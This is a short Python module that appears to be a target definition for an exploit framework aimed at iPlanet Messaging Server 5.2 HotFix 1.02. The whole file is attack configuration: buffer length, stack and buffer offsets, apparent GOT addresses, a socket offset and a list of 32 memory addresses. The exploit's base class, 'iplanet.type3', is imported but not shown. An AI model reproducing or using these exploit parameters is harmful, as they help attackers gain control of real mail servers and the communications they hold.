import iplanet

class iplanet_5_2hf1_02(iplanet.type3):
   def __init__(self):
      self.conn = 0

   version = 'iPlanet Messaging Server 5.2 HotFix 1.02 (built Sep 16 2002)'
   baseBufLen = 0x1bc
   l7Offset = -0x2404L
   l7Imta = 0x554510L
   l7ImtaResponse = 0x53bc74L
   got = [0x55e9b4L, 0x4fad00L, 0x4fad08L, 0x4fad10L]
   fp = 0x979020L
   bigBufOffset = -0x26f8L
   socketOffset = -0x3d8L
   addrs = \
      [0x55DB5CL ,
       0x5ABC5CL ,
       0x5CC4DCL ,
       0x5ED8B8L ,
       0x60C6ACL ,
       0x628418L ,
       0x644650L ,
       0x661BB8L ,
       0x67CE30L ,
       0x698D0CL ,
       0x6B5BC8L ,
       0x6D2764L ,
       0x6F1E78L ,
       0x70F7ACL ,
       0x72AF7CL ,
       0x7470C8L ,
       0x763374L ,
       0x77F560L ,
       0x79BFE4L ,
       0x7B7D78L ,
       0x7D4F70L ,
       0x7F1BACL ,
       0x81E9E0L ,
       0x83E078L ,
       0x85F038L ,
       0x880738L ,
       0x8B10B4L ,
       0x8E1CC4L ,
       0x9020F0L ,
       0x91E27CL ,
       0x93DCC0L ,
       0x95DD10L ]
